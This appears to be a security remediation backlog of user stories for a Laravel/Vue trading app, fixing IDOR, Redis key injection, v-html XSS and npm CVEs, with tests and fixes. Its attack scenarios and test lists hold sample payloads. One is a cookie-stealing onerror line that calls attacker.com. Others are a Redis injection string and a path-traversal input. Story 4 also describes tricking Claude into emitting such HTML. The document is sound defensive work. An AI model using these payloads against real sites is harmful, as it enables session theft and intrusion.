# Security Remediation Stories - BMAD Method

**Epic**: Security Vulnerability Remediation (Phase 1 - CRITICAL)
**Created**: 2026-01-10
**Priority**: CRITICAL (Blocks Deployment)
**Source**: Security Audit Report 2026-01-10

---

## Epic Overview

### Context
Security audit identified 12 vulnerabilities (9 CRITICAL, 3 HIGH). This epic covers Phase 1 remediation of all 9 CRITICAL issues that block production deployment.

### Success Metrics
- ✅ All 9 CRITICAL vulnerabilities patched
- ✅ Security tests pass for each fix
- ✅ No regression in existing functionality
- ✅ Build succeeds (backend + frontend)
- ✅ Security score improves from 58/100 to ≥80/100

### Timeline
**Target**: Complete within 2-3 hours
**Deadline**: Before next production deployment

---

## Stories

### Story 1: Fix IDOR in JournalTradeFormController - suggestion_id Validation

**ID**: `story-security-idor-suggestion-id`
**Epic**: Security Remediation Phase 1
**Priority**: 🔴 CRITICAL
**Estimated Time**: 10 minutes
**Component**: Backend - JournalTradeFormController

#### Objective

Prevent IDOR vulnerability where authenticated users can link their trades to other users' suggestions by adding ownership validation to the `suggestion_id` field.

#### Current Vulnerability

**File**: `app/Http/Controllers/JournalTradeFormController.php`
**Line**: 122
**OWASP**: A01:2021 - Broken Access Control

**Vulnerable Code**:
```php
'suggestion_id' => 'nullable|integer|exists:trades,id', // ❌ Only checks existence
```

**Attack Scenario**:
1. User A creates suggestion (Trade ID 100)
2. User B submits form with `suggestion_id=100`
3. Validation passes (only checks ID exists)
4. User B's trade links to User A's suggestion
5. Impact: Data corruption, incorrect analytics

#### Acceptance Criteria

- [ ] **AC1**: Validation rule includes ownership check: `Rule::exists('trades', 'id')->where('user_id', auth()->id())`
- [ ] **AC2**: Attack payload `{"suggestion_id": 999}` (other user's ID) returns `422 Validation Error`
- [ ] **AC3**: Valid suggestion ID belonging to authenticated user passes validation
- [ ] **AC4**: Null suggestion_id continues to work (nullable constraint respected)
- [ ] **AC5**: Error message is clear: "Selected suggestion does not belong to you"

#### Technical Implementation Notes

**Approach**: Use Laravel validation Rule object with where clause

**File to Modify**: `app/Http/Controllers/JournalTradeFormController.php`

**Implementation**:
```php
use Illuminate\Validation\Rule;

// Replace line 122 with:
'suggestion_id' => [
    'nullable',
    'integer',
    Rule::exists('trades', 'id')
        ->where('user_id', auth()->id())
        ->where('status', 'suggested'), // Bonus: ensure it's actually a suggestion
],
```

**Alternative Approach** (if Rule not preferred):
```php
// Add runtime check after validation (line 225):
if (!empty($validated['suggestion_id'])) {
    $ownsSuggestion = Trade::where('id', $validated['suggestion_id'])
        ->where('user_id', auth()->id())
        ->exists();

    if (!$ownsSuggestion) {
        return back()->withErrors([
            'suggestion_id' => __('Selected suggestion does not belong to you.')
        ]);
    }

    $suggestionEngine->validateSuggestion($validated['suggestion_id'], true);
}
```

**Security Pattern**: Ownership validation at validation layer (preferred) OR controller layer (fallback)

#### Dependencies

- ✅ DONE: User authentication system (already implemented)
- ✅ DONE: Trade model with user_id relationship
- ⏳ PENDING: None - can be implemented independently

#### Testing Requirements

**Unit Test** (`tests/Unit/Controllers/JournalTradeFormControllerTest.php`):
```php
public function test_cannot_use_other_users_suggestion()
{
    $userA = User::factory()->create();
    $userB = User::factory()->create();

    // User A creates suggestion
    $suggestion = Trade::factory()->create([
        'user_id' => $userA->id,
        'status' => 'suggested',
    ]);

    // User B attempts to use it
    $response = $this->actingAs($userB)
        ->postJson('/journal/trades/store', [
            'suggestion_id' => $suggestion->id,
            'symbol' => 'BTCUSDT',
            // ... other required fields
        ]);

    $response->assertStatus(422);
    $response->assertJsonValidationErrors('suggestion_id');
}

public function test_can_use_own_suggestion()
{
    $user = User::factory()->create();

    $suggestion = Trade::factory()->create([
        'user_id' => $user->id,
        'status' => 'suggested',
    ]);

    $response = $this->actingAs($user)
        ->postJson('/journal/trades/store', [
            'suggestion_id' => $suggestion->id,
            'symbol' => 'BTCUSDT',
            // ... other required fields
        ]);

    $response->assertStatus(201);
}
```

**Manual Test**:
1. Create suggestion with User A (note ID)
2. Log in as User B
3. Submit trade form with User A's suggestion ID
4. Expected: 422 validation error
5. Submit with User B's own suggestion ID
6. Expected: 201 success

#### Definition of Done

- [ ] Code implemented and follows security pattern
- [ ] Unit tests written and passing
- [ ] Manual penetration test executed (attempt IDOR attack)
- [ ] No regression in existing trade creation flow
- [ ] Security comment added: `// ✅ SECURITY FIX: Prevent IDOR`
- [ ] Documented in commit message
- [ ] **🔍 CODE REVIEW AGENT**: Launch agent reviewer with `docs/Prompt_system_Agent_Reviewer.md` protocol
  - Agent must verify ALL acceptance criteria are met
  - Agent must validate security pattern implementation
  - Agent must check for edge cases and potential bypasses
  - Agent must return explicit GO/NO-GO decision
  - If NO-GO: Apply fixes and re-submit to agent
  - Only proceed to commit when agent returns GO

---

### Story 2: Fix scanSessionId Injection - Input Validation

**ID**: `story-security-injection-scan-session-validation`
**Epic**: Security Remediation Phase 1
**Priority**: 🔴 CRITICAL
**Estimated Time**: 30 minutes
**Component**: Backend - MarketScanController

#### Objective

Prevent SQL/Redis injection vulnerability by validating `scanSessionId` route parameter format and ownership across all three endpoints.

#### Current Vulnerability

**File**: `app/Http/Controllers/Api/MarketScanController.php`
**Lines**: 224, 290, 439
**OWASP**: A03:2021 - Injection

**Vulnerable Code**:
```php
// Line 224
public function getProgress(Request $request, string $scanSessionId)
{
    $cacheKey = "scan_progress_{$user->id}_{$scanSessionId}";  // ❌ Direct interpolation
    $progress = Cache::get($cacheKey);

// Line 290
$batchId = Cache::get("scan_batch_{$scanSessionId}");  // ❌ Unvalidated

// Line 439
$eventsKey = "scan_events_{$user->id}_{$scanSessionId}";  // ❌ Unsanitized
\Illuminate\Support\Facades\Redis::llen($eventsKey);
```

**Attack Scenario**:
```
GET /api/v1/market-scan/progress/scan_123" + Redis::set("admin", "1
→ Cache key becomes: scan_progress_999_scan_123" + Redis::set("admin", "1"
→ Potential Redis command injection
```

#### Acceptance Criteria

- [ ] **AC1**: `scanSessionId` validated with regex `/^scan_[a-f0-9\.]+$/` in all 3 endpoints
- [ ] **AC2**: Invalid format returns `400 Bad Request` with message "Invalid session ID format"
- [ ] **AC3**: Ownership validation via cache key `scan_owner_{scanSessionId}` matches `$user->id`
- [ ] **AC4**: Unauthorized access returns `403 Forbidden` with message "Unauthorized scan access"
- [ ] **AC5**: Valid session ID belonging to user returns data successfully
- [ ] **AC6**: Ownership cache entry created in `triggerScan()` with 10-min TTL
- [ ] **AC7**: Malicious payload `scan_123" + Redis::set("x", "1` is rejected at validation

#### Technical Implementation Notes

**Files to Modify**:
1. `app/Http/Controllers/Api/MarketScanController.php` (3 methods + triggerScan)

**Helper Method** (add to MarketScanController):
```php
/**
 * Validate and authorize scan session access
 *
 * @throws \Symfony\Component\HttpKernel\Exception\HttpException
 */
private function validateAndAuthorizeScanSession(string $scanSessionId, User $user): void
{
    // ✅ SECURITY FIX: Validate format (prevent injection)
    if (!preg_match('/^scan_[a-f0-9\.]+$/', $scanSessionId)) {
        abort(400, 'Invalid session ID format');
    }

    // ✅ SECURITY FIX: Verify ownership (prevent IDOR)
    $sessionOwner = Cache::get("scan_owner_{$scanSessionId}");

    if ($sessionOwner === null) {
        abort(404, 'Scan session not found or expired');
    }

    if ($sessionOwner !== $user->id) {
        abort(403, 'Unauthorized scan access');
    }
}
```

**Update getProgress()** (line 224):
```php
public function getProgress(Request $request, string $scanSessionId)
{
    $user = $request->user();

    // ✅ SECURITY FIX: Validate and authorize before use
    $this->validateAndAuthorizeScanSession($scanSessionId, $user);

    $cacheKey = "scan_progress_{$user->id}_{$scanSessionId}";
    $progress = Cache::get($cacheKey);
    // ... rest of method
}
```

**Update cancelScan()** (line 290):
```php
public function cancelScan(Request $request, string $scanSessionId)
{
    $user = $request->user();

    // ✅ SECURITY FIX: Validate and authorize
    $this->validateAndAuthorizeScanSession($scanSessionId, $user);

    $batchId = Cache::get("scan_batch_{$scanSessionId}");
    // ... rest of method
}
```

**Update getEvents()** (line 439):
```php
public function getEvents(Request $request, string $scanSessionId)
{
    $user = $request->user();

    // ✅ SECURITY FIX: Validate and authorize
    $this->validateAndAuthorizeScanSession($scanSessionId, $user);

    $eventsKey = "scan_events_{$user->id}_{$scanSessionId}";
    // ... rest of method
}
```

**Update triggerScan()** (around line 120):
```php
public function triggerScan(Request $request)
{
    $user = $request->user();
    $scanSessionId = uniqid('scan_', true);

    // ... existing validation ...

    // ✅ SECURITY FIX: Store ownership for later validation
    Cache::put("scan_owner_{$scanSessionId}", $user->id, 600); // 10 minutes

    MarketScanJob::dispatch($user->id, null, $scanSessionId);
    // ... rest of method
}
```

#### Dependencies

- ✅ DONE: Cache system configured
- ✅ DONE: Authentication middleware
- ⏳ PENDING: None

#### Testing Requirements

**Unit Tests** (`tests/Unit/Controllers/MarketScanControllerTest.php`):
```php
public function test_rejects_invalid_scan_session_format()
{
    $user = User::factory()->create();

    // Invalid formats
    $invalidIds = [
        'scan_123" + Redis::set("x", "1',
        'scan_<script>alert(1)</script>',
        '../../../etc/passwd',
        'scan_INVALID@#$',
    ];

    foreach ($invalidIds as $invalidId) {
        $response = $this->actingAs($user)
            ->getJson("/api/v1/market-scan/progress/{$invalidId}");

        $response->assertStatus(400);
        $response->assertJson(['message' => 'Invalid session ID format']);
    }
}

public function test_rejects_unauthorized_scan_access()
{
    $userA = User::factory()->create();
    $userB = User::factory()->create();

    // User A triggers scan
    $scanSessionId = uniqid('scan_', true);
    Cache::put("scan_owner_{$scanSessionId}", $userA->id, 600);

    // User B attempts to access it
    $response = $this->actingAs($userB)
        ->getJson("/api/v1/market-scan/progress/{$scanSessionId}");

    $response->assertStatus(403);
    $response->assertJson(['message' => 'Unauthorized scan access']);
}

public function test_allows_owner_to_access_scan()
{
    $user = User::factory()->create();

    $scanSessionId = uniqid('scan_', true);
    Cache::put("scan_owner_{$scanSessionId}", $user->id, 600);
    Cache::put("scan_progress_{$user->id}_{$scanSessionId}", ['progress' => 50], 600);

    $response = $this->actingAs($user)
        ->getJson("/api/v1/market-scan/progress/{$scanSessionId}");

    $response->assertStatus(200);
    $response->assertJson(['progress' => 50]);
}
```

**Manual Penetration Test**:
1. Trigger scan as User A (note session ID)
2. Attempt injection: `GET /api/v1/market-scan/progress/scan_123" + malicious`
3. Expected: 400 Bad Request
4. Log in as User B
5. Attempt access: `GET /api/v1/market-scan/progress/{userA_session_id}`
6. Expected: 403 Forbidden
7. Access as User A with valid ID
8. Expected: 200 Success with data

#### Definition of Done

- [ ] Helper method `validateAndAuthorizeScanSession()` implemented
- [ ] All 3 endpoints updated with validation call
- [ ] `triggerScan()` stores ownership in cache
- [ ] Unit tests written and passing (3 test cases minimum)
- [ ] Manual penetration test executed with injection payloads
- [ ] Redis monitoring confirms no command injection
- [ ] Security comments added
- [ ] Documented in commit message
- [ ] **🔍 CODE REVIEW AGENT**: Launch agent reviewer with `docs/Prompt_system_Agent_Reviewer.md` protocol
  - Agent must verify ALL acceptance criteria are met
  - Agent must validate regex pattern prevents injection
  - Agent must check ownership validation is unbypassable
  - Agent must test with malicious payloads from attack scenarios
  - Agent must return explicit GO/NO-GO decision
  - If NO-GO: Apply fixes and re-submit to agent
  - Only proceed to commit when agent returns GO

---

### Story 3: Fix XSS in CooloffBanner - Remove v-html

**ID**: `story-security-xss-cooloff-banner`
**Epic**: Security Remediation Phase 1
**Priority**: 🔴 CRITICAL
**Estimated Time**: 5 minutes
**Component**: Frontend - Vue Components

#### Objective

Eliminate XSS vulnerability by replacing `v-html` directive with safe text interpolation in CooloffBanner component.

#### Current Vulnerability

**File**: `resources/js/Components/CooloffBanner.vue`
**Line**: 256
**OWASP**: A03:2021 - Injection (XSS)

**Vulnerable Code**:
```vue
<div class="text-xs md:text-sm" v-html="$t('cooloff.emergency_message')"></div>
```

**Attack Scenario**:
1. Attacker compromises `fr.json` translation file
2. Injects: `"cooloff.emergency_message": "<img src=x onerror='alert(document.cookie)'>"`
3. All users load CooloffBanner
4. `v-html` renders malicious HTML
5. JavaScript executes, stealing session cookies

#### Acceptance Criteria

- [ ] **AC1**: `v-html` directive removed from line 256
- [ ] **AC2**: Replaced with text interpolation: `{{ $t('cooloff.emergency_message') }}`
- [ ] **AC3**: Translation string renders correctly (no broken display)
- [ ] **AC4**: HTML tags in translation (if any) are escaped automatically
- [ ] **AC5**: Component builds successfully without errors
- [ ] **AC6**: Visual appearance unchanged (text styling preserved)

#### Technical Implementation Notes

**File to Modify**: `resources/js/Components/CooloffBanner.vue`

**Change** (line 256):
```vue
<!-- ❌ BEFORE (VULNERABLE) -->
<div class="text-xs md:text-sm" v-html="$t('cooloff.emergency_message')"></div>

<!-- ✅ AFTER (SECURE) -->
<div class="text-xs md:text-sm">{{ $t('cooloff.emergency_message') }}</div>
```

**Verification**: Check translation file `resources/js/locales/fr.json` to ensure no HTML is intentionally used:
```json
{
  "cooloff": {
    "emergency_message": "Plain text message, no HTML tags"
  }
}
```

If HTML formatting is absolutely required (unlikely), use DOMPurify:
```vue
<div class="text-xs md:text-sm" v-html="sanitize($t('cooloff.emergency_message'))"></div>

<script setup>
import DOMPurify from 'dompurify';
const sanitize = (html) => DOMPurify.sanitize(html, {ALLOWED_TAGS: ['b', 'strong']});
</script>
```

**Recommendation**: Use text interpolation (no DOMPurify needed for plain text)

#### Dependencies

- ✅ DONE: vue-i18n configured
- ✅ DONE: Translation files exist
- ⏳ PENDING: None

#### Testing Requirements

**Manual Test**:
1. Open page with CooloffBanner component
2. Verify message displays correctly
3. Inspect DOM: confirm no `innerHTML` rendering
4. Test with malicious translation (dev environment):
   ```json
   "cooloff.emergency_message": "<script>alert('XSS')</script>Test"
   ```
5. Expected: Script tags visible as text (escaped), no alert popup
6. Restore original translation

**Visual Regression Test**:
1. Take screenshot before fix
2. Apply fix
3. Take screenshot after fix
4. Compare: text should be identical
5. Check responsive breakpoints (xs, md)

#### Definition of Done

- [ ] `v-html` removed from CooloffBanner.vue:256
- [ ] Replaced with `{{ }}` text interpolation
- [ ] Translation verified to contain no intentional HTML
- [ ] Manual XSS test performed (malicious translation escaped)
- [ ] Visual appearance unchanged
- [ ] Frontend build succeeds (`npm run build`)
- [ ] No console errors in browser
- [ ] Documented in commit message
- [ ] **🔍 CODE REVIEW AGENT**: Launch agent reviewer with `docs/Prompt_system_Agent_Reviewer.md` protocol
  - Agent must verify `v-html` is completely removed
  - Agent must confirm text interpolation `{{ }}` is used
  - Agent must check no other XSS vectors introduced
  - Agent must validate translation files contain no HTML
  - Agent must return explicit GO/NO-GO decision
  - If NO-GO: Apply fixes and re-submit to agent
  - Only proceed to commit when agent returns GO

---

### Story 4: Fix XSS in StrategyParsingSection - Sanitize Claude AI Output

**ID**: `story-security-xss-strategy-parsing`
**Epic**: Security Remediation Phase 1
**Priority**: 🔴 CRITICAL
**Estimated Time**: 10 minutes
**Component**: Frontend - Vue Components

#### Objective

Eliminate XSS vulnerability in StrategyParsingSection where Claude AI's `strategySummary` output is rendered with `v-html`, potentially allowing script injection.

#### Current Vulnerability

**File**: `resources/js/Components/StrategyParsingSection.vue`
**Line**: 1504
**OWASP**: A03:2021 - Injection (XSS)

**Vulnerable Code**:
```vue
<div v-if="strategySummary"
     class="max-h-96 overflow-y-auto pr-2 custom-scrollbar text-sm text-gray-700 dark:text-gray-300 space-y-3 whitespace-pre-line"
     v-html="strategySummary"></div>
```

**Attack Scenario**:
1. Attacker crafts strategy prompt to trick Claude
2. Claude generates: `"## Summary\n<img src=x onerror='fetch(\"attacker.com?c=\"+document.cookie)'>"`
3. `strategySummary` contains malicious HTML
4. `v-html` renders it → session cookie stolen

#### Acceptance Criteria

- [ ] **AC1**: `v-html` removed OR replaced with DOMPurify sanitization
- [ ] **AC2**: Text content (non-HTML) displays correctly with line breaks preserved
- [ ] **AC3**: If HTML formatting needed (headings, bold), only safe tags allowed: `<h1-6>, <b>, <strong>, <i>, <em>, <br>, <p>`
- [ ] **AC4**: Script tags, event handlers (onclick, onerror), and iframes are stripped
- [ ] **AC5**: Markdown-style headings render correctly if Claude uses them
- [ ] **AC6**: Component builds successfully
- [ ] **AC7**: Claude AI output displays with proper formatting (readable)

#### Technical Implementation Notes

**File to Modify**: `resources/js/Components/StrategyParsingSection.vue`

**Option 1: Pure Text (RECOMMENDED)** - If Claude output is plain text:
```vue
<!-- ✅ SECURE: Text interpolation with whitespace preserved -->
<div v-if="strategySummary"
     class="max-h-96 overflow-y-auto pr-2 custom-scrollbar text-sm text-gray-700 dark:text-gray-300 space-y-3 whitespace-pre-line">
  {{ strategySummary }}
</div>
```

**Option 2: Sanitized HTML** - If Claude uses markdown/HTML formatting:
```vue
<div v-if="strategySummary"
     class="max-h-96 overflow-y-auto pr-2 custom-scrollbar text-sm text-gray-700 dark:text-gray-300 space-y-3"
     v-html="sanitizedSummary"></div>

<script setup>
import DOMPurify from 'dompurify';
import { computed } from 'vue';

const sanitizedSummary = computed(() => {
  if (!strategySummary.value) return '';

  // ✅ SECURITY FIX: Sanitize Claude AI output
  return DOMPurify.sanitize(strategySummary.value, {
    ALLOWED_TAGS: ['h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'b', 'strong', 'i', 'em', 'br', 'p', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: [], // No attributes (no onclick, href, src, etc.)
  });
});
</script>
```

**Install DOMPurify** (if Option 2):
```bash
npm install dompurify
npm install --save-dev @types/dompurify  # TypeScript types
```

**Recommendation**: Start with Option 1 (text). If formatting breaks, implement Option 2.

#### Dependencies

- ✅ DONE: strategySummary populated from Claude AI
- ⏳ PENDING: DOMPurify installation (if Option 2 chosen)
- ⏳ PENDING: None (Option 1)

#### Testing Requirements

**Unit Test** (if DOMPurify used):
```javascript
import { describe, it, expect } from 'vitest';
import DOMPurify from 'dompurify';

describe('strategySummary sanitization', () => {
  it('allows safe HTML tags', () => {
    const input = '<h1>Title</h1><p>Text with <strong>bold</strong></p>';
    const output = DOMPurify.sanitize(input, {
      ALLOWED_TAGS: ['h1', 'p', 'strong'],
      ALLOWED_ATTR: [],
    });
    expect(output).toContain('<h1>Title</h1>');
    expect(output).toContain('<strong>bold</strong>');
  });

  it('strips script tags', () => {
    const input = '<p>Text</p><script>alert("XSS")</script>';
    const output = DOMPurify.sanitize(input, {
      ALLOWED_TAGS: ['p'],
      ALLOWED_ATTR: [],
    });
    expect(output).not.toContain('<script>');
    expect(output).toContain('<p>Text</p>');
  });

  it('strips event handlers', () => {
    const input = '<img src=x onerror="alert(1)"> <div onclick="alert(2)">Click</div>';
    const output = DOMPurify.sanitize(input, {
      ALLOWED_TAGS: ['div'],
      ALLOWED_ATTR: [],
    });
    expect(output).not.toContain('onerror');
    expect(output).not.toContain('onclick');
  });
});
```

**Manual Test**:
1. Trigger strategy parsing with Claude
2. Verify summary displays correctly
3. Inspect DOM: check if HTML tags present
4. Test with malicious Claude prompt (dev):
   - Prompt: "Generate a summary with: <script>alert('XSS')</script>"
5. Expected: Script tags removed or escaped
6. Test with legitimate formatting:
   - Prompt: "Generate summary with markdown headings"
7. Expected: Headings render correctly (if DOMPurify used)

**Browser Console Check**:
```javascript
// Should NOT execute
console.log(document.querySelectorAll('script').length); // Expected: 0 new scripts
```

#### Definition of Done

- [ ] `v-html` removed OR DOMPurify implemented
- [ ] If DOMPurify used: installed and configured with safe tag whitelist
- [ ] Unit tests written and passing (if DOMPurify)
- [ ] Manual XSS test performed with malicious Claude output
- [ ] Legitimate Claude summaries display correctly
- [ ] Frontend build succeeds
- [ ] No console errors or warnings
- [ ] Security comment added
- [ ] Documented in commit message
- [ ] **🔍 CODE REVIEW AGENT**: Launch agent reviewer with `docs/Prompt_system_Agent_Reviewer.md` protocol
  - Agent must verify XSS protection implemented correctly
  - If text interpolation: confirm `v-html` removed
  - If DOMPurify: validate tag whitelist is minimal and secure
  - Agent must test with script injection payloads
  - Agent must check Claude AI output can't bypass sanitization
  - Agent must return explicit GO/NO-GO decision
  - If NO-GO: Apply fixes and re-submit to agent
  - Only proceed to commit when agent returns GO

---

### Story 5: Fix XSS in TradeList - Pagination Label Escaping

**ID**: `story-security-xss-tradelist-pagination`
**Epic**: Security Remediation Phase 1
**Priority**: 🔴 CRITICAL
**Estimated Time**: 5 minutes
**Component**: Frontend - Vue Pages

#### Objective

Eliminate XSS vulnerability in TradeList pagination where Laravel pagination link labels are rendered with `v-html`.

#### Current Vulnerability

**File**: `resources/js/Pages/Journal/TradeList.vue`
**Line**: 738
**OWASP**: A03:2021 - Injection (XSS)

**Vulnerable Code**:
```vue
<button
    v-for="link in trades.links"
    :key="link.label"
    @click="navigateToPage(link.url)"
    v-html="link.label"
    :disabled="!link.url"
/>
```

**Attack Scenario**:
1. Attacker injects XSS in database trades data
2. Laravel pagination generates: `{label: '<img src=x onerror="alert(1)">', url: '...'}`
3. Frontend renders with `v-html`
4. JavaScript executes when user views pagination

#### Acceptance Criteria

- [ ] **AC1**: `v-html="link.label"` removed from pagination button
- [ ] **AC2**: Replaced with text interpolation: `{{ link.label }}`
- [ ] **AC3**: Pagination labels display correctly ("Previous", "1", "2", "Next")
- [ ] **AC4**: Special characters in labels are auto-escaped
- [ ] **AC5**: HTML entities in labels (like `&laquo;` for «) render as symbols OR are escaped
- [ ] **AC6**: Component builds successfully
- [ ] **AC7**: Pagination click functionality works

#### Technical Implementation Notes

**File to Modify**: `resources/js/Pages/Journal/TradeList.vue`

**Change** (line 735-744):
```vue
<!-- ❌ BEFORE (VULNERABLE) -->
<button
    v-for="link in trades.links"
    :key="link.label"
    @click="navigateToPage(link.url)"
    v-html="link.label"
    :class="[...]"
    :disabled="!link.url"
/>

<!-- ✅ AFTER (SECURE) -->
<button
    v-for="link in trades.links"
    :key="link.label"
    @click="navigateToPage(link.url)"
    :class="[...]"
    :disabled="!link.url"
>
  {{ link.label }}
</button>
```

**Note**: Laravel pagination labels are typically plain text ("Previous", "Next", page numbers). HTML entities like `&laquo;` will be auto-escaped to `«` by Vue's text interpolation.

**Verification**: Check Laravel pagination config if custom labels used:
```php
// config/pagination.php or Paginator::useBootstrap()
// Ensure labels don't contain HTML
```

#### Dependencies

- ✅ DONE: Laravel pagination configured
- ✅ DONE: Inertia props include `trades.links`
- ⏳ PENDING: None

#### Testing Requirements

**Manual Test**:
1. Navigate to TradeList page
2. Verify pagination displays correctly
3. Click each pagination button (Previous, 1, 2, Next)
4. Expected: Navigation works, labels visible
5. Inspect DOM: confirm no `innerHTML` rendering
6. Test with malicious backend data (dev):
   ```php
   // In controller
   $trades = Trade::paginate(10);
   $trades->links[1]->label = '<script>alert("XSS")</script>';
   ```
7. Expected: Script tags visible as text (escaped)

**Edge Cases**:
- Empty pagination (1 page only)
- First page (no Previous)
- Last page (no Next)
- Special characters in labels

#### Definition of Done

- [ ] `v-html` removed from pagination button
- [ ] Replaced with `{{ link.label }}`
- [ ] Manual test performed with all pagination states
- [ ] XSS test executed with malicious label
- [ ] Labels display correctly (Previous, numbers, Next)
- [ ] Navigation functionality works
- [ ] Frontend build succeeds
- [ ] No console errors
- [ ] Documented in commit message
- [ ] **🔍 CODE REVIEW AGENT**: Launch agent reviewer with `docs/Prompt_system_Agent_Reviewer.md` protocol
  - Agent must verify `v-html` removed from pagination loop
  - Agent must confirm text interpolation used correctly
  - Agent must check pagination data source (Laravel) is safe
  - Agent must validate no other v-html in TradeList.vue
  - Agent must return explicit GO/NO-GO decision
  - If NO-GO: Apply fixes and re-submit to agent
  - Only proceed to commit when agent returns GO

---

### Story 6: Fix XSS in StrategyShow - Translation Escaping

**ID**: `story-security-xss-strategy-show`
**Epic**: Security Remediation Phase 1
**Priority**: 🔴 CRITICAL
**Estimated Time**: 5 minutes
**Component**: Frontend - Vue Pages

#### Objective

Eliminate XSS vulnerability by removing `v-html` from i18n translation in StrategyShow component.

#### Current Vulnerability

**File**: `resources/js/Pages/Assistant/StrategyShow.vue`
**Line**: 369
**OWASP**: A03:2021 - Injection (XSS)

**Vulnerable Code**:
```vue
<p class="text-blue-700 dark:text-blue-300 text-sm font-medium" v-html="t('strategies.proprietaryNoteWatchlist')"></p>
```

**Attack Scenario**: Same as Story 3 (CooloffBanner)

#### Acceptance Criteria

- [ ] **AC1**: `v-html` removed from line 369
- [ ] **AC2**: Replaced with text interpolation: `{{ t('strategies.proprietaryNoteWatchlist') }}`
- [ ] **AC3**: Translation text displays correctly
- [ ] **AC4**: HTML tags in translation (if any) are escaped
- [ ] **AC5**: Component builds successfully
- [ ] **AC6**: Visual appearance unchanged

#### Technical Implementation Notes

**File to Modify**: `resources/js/Pages/Assistant/StrategyShow.vue`

**Change** (line 369):
```vue
<!-- ❌ BEFORE -->
<p class="text-blue-700 dark:text-blue-300 text-sm font-medium" v-html="t('strategies.proprietaryNoteWatchlist')"></p>

<!-- ✅ AFTER -->
<p class="text-blue-700 dark:text-blue-300 text-sm font-medium">{{ t('strategies.proprietaryNoteWatchlist') }}</p>
```

**Verification**: Check translation contains no intentional HTML:
```json
{
  "strategies": {
    "proprietaryNoteWatchlist": "Plain text message"
  }
}
```

#### Dependencies

- ✅ DONE: useI18n configured
- ✅ DONE: Translation keys exist
- ⏳ PENDING: None

#### Testing Requirements

**Manual Test**:
1. Open StrategyShow page
2. Verify proprietary note displays
3. Test with malicious translation (dev)
4. Expected: HTML escaped

#### Definition of Done

- [ ] `v-html` removed
- [ ] Text interpolation used
- [ ] Translation verified
- [ ] Manual XSS test performed
- [ ] Build succeeds
- [ ] Documented in commit message
- [ ] **🔍 CODE REVIEW AGENT**: Launch agent reviewer with `docs/Prompt_system_Agent_Reviewer.md` protocol
  - Agent must verify `v-html` removed from StrategyShow.vue:369
  - Agent must confirm text interpolation used
  - Agent must validate translation file contains no HTML
  - Agent must return explicit GO/NO-GO decision
  - If NO-GO: Apply fixes and re-submit to agent
  - Only proceed to commit when agent returns GO

---

### Story 7: Fix XSS in StrategyEdit - Translation Escaping

**ID**: `story-security-xss-strategy-edit`
**Epic**: Security Remediation Phase 1
**Priority**: 🔴 CRITICAL
**Estimated Time**: 5 minutes
**Component**: Frontend - Vue Pages

#### Objective

Eliminate XSS vulnerability by removing `v-html` from i18n translation in StrategyEdit component.

#### Current Vulnerability

**File**: `resources/js/Pages/Assistant/StrategyEdit.vue`
**Line**: 503
**OWASP**: A03:2021 - Injection (XSS)

**Vulnerable Code**:
```vue
<p class="text-blue-800 dark:text-blue-200 mb-3" v-html="t('strategies.proprietaryEditMessage')"></p>
```

**Attack Scenario**: Same as Stories 3 and 6

#### Acceptance Criteria

- [ ] **AC1**: `v-html` removed from line 503
- [ ] **AC2**: Replaced with `{{ t('strategies.proprietaryEditMessage') }}`
- [ ] **AC3**: Translation displays correctly
- [ ] **AC4**: HTML escaped automatically
- [ ] **AC5**: Build succeeds
- [ ] **AC6**: Visual unchanged

#### Technical Implementation Notes

**File to Modify**: `resources/js/Pages/Assistant/StrategyEdit.vue`

**Change** (line 503):
```vue
<!-- ❌ BEFORE -->
<p class="text-blue-800 dark:text-blue-200 mb-3" v-html="t('strategies.proprietaryEditMessage')"></p>

<!-- ✅ AFTER -->
<p class="text-blue-800 dark:text-blue-200 mb-3">{{ t('strategies.proprietaryEditMessage') }}</p>
```

#### Dependencies

- ✅ DONE: useI18n configured
- ⏳ PENDING: None

#### Testing Requirements

**Manual Test**:
1. Open StrategyEdit page
2. Verify message displays
3. XSS test with malicious translation
4. Expected: Escaped

#### Definition of Done

- [ ] `v-html` removed
- [ ] Text interpolation used
- [ ] Manual test performed
- [ ] Build succeeds
- [ ] Documented in commit message
- [ ] **🔍 CODE REVIEW AGENT**: Launch agent reviewer with `docs/Prompt_system_Agent_Reviewer.md` protocol
  - Agent must verify `v-html` removed from StrategyEdit.vue:503
  - Agent must confirm text interpolation used
  - Agent must validate translation file contains no HTML
  - Agent must return explicit GO/NO-GO decision
  - If NO-GO: Apply fixes and re-submit to agent
  - Only proceed to commit when agent returns GO

---

### Story 8: Update npm Dependencies - Fix CVE Vulnerabilities

**ID**: `story-security-npm-dependencies-update`
**Epic**: Security Remediation Phase 1
**Priority**: 🔴 CRITICAL
**Estimated Time**: 5 minutes
**Component**: Frontend - Dependencies

#### Objective

Update npm packages to patch 2 HIGH severity CVE vulnerabilities (Preact JSON VNode injection and QS arrayLimit DoS).

#### Current Vulnerabilities

**Package 1**: `preact` (10.27.0 - 10.27.2)
**CVE**: JSON VNode Injection
**Severity**: HIGH
**Fix Version**: >= 10.27.3
**Advisory**: https://github.com/advisories/GHSA-36hm-qxxp-pg3m

**Package 2**: `qs` (<6.14.1)
**CVE**: arrayLimit bypass (memory exhaustion DoS)
**Severity**: HIGH
**Fix Version**: >= 6.14.1
**Advisory**: https://github.com/advisories/GHSA-6rw7-vpxm-498p

#### Acceptance Criteria

- [ ] **AC1**: `npm audit` shows 0 HIGH severity vulnerabilities
- [ ] **AC2**: `preact` updated to >= 10.27.3
- [ ] **AC3**: `qs` updated to >= 6.14.1
- [ ] **AC4**: `package-lock.json` updated with new versions
- [ ] **AC5**: Frontend build succeeds: `npm run build`
- [ ] **AC6**: Dev server runs without errors: `npm run dev`
- [ ] **AC7**: No regression in existing functionality

#### Technical Implementation Notes

**Commands**:
```bash
# Run audit fix (automatic)
npm audit fix

# Verify fixes
npm audit

# If audit fix doesn't work, manual update:
npm install preact@latest
npm install qs@latest

# Rebuild
npm run build
```

**Expected Output**:
```
audited X packages in Xs

found 0 vulnerabilities
```

**Files Modified**:
- `package.json` (version ranges updated)
- `package-lock.json` (exact versions locked)

#### Dependencies

- ✅ DONE: npm installed
- ✅ DONE: package.json exists
- ⏳ PENDING: None

#### Testing Requirements

**Automated Verification**:
```bash
# Check versions
npm list preact
npm list qs

# Expected output:
# preact@10.27.3 or higher
# qs@6.14.1 or higher

# Run audit
npm audit

# Expected: 0 vulnerabilities
```

